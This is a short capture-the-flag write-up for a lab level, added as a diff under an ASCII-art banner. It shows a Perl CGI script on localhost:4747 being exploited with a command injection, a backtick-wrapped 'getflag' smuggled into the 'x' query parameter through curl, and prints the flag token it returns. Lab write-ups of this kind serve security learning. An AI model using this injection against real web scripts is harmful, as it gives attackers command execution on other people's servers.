@@ -1,0 +1,22 @@
+
+██╗     ███████╗██╗   ██╗███████╗██╗          ██████╗ ██╗  ██╗
+██║     ██╔════╝██║   ██║██╔════╝██║         ██╔═████╗██║  ██║
+██║     █████╗  ██║   ██║█████╗  ██║         ██║██╔██║███████║
+██║     ██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║         ████╔╝██║╚════██║
+███████╗███████╗ ╚████╔╝ ███████╗███████╗    ╚██████╔╝     ██║
+╚══════╝╚══════╝  ╚═══╝  ╚══════╝╚══════╝     ╚═════╝      ╚═╝
+                                                            
+
+cat level04.pl
+
+We see the comment:
+# localhost:4747
+
+In /var/www there is a project named level04 with a simple index.html page.
+This page run the script level04.pl which display the value of the 'x' variable.
+
+curl localhost:4747?x=\`getflag\`
+						
+                                |═══════════════════════════|
+Check flag.Here is your token : | ne2searoevaevoem4ov4ar8ap |
+                                |═══════════════════════════|
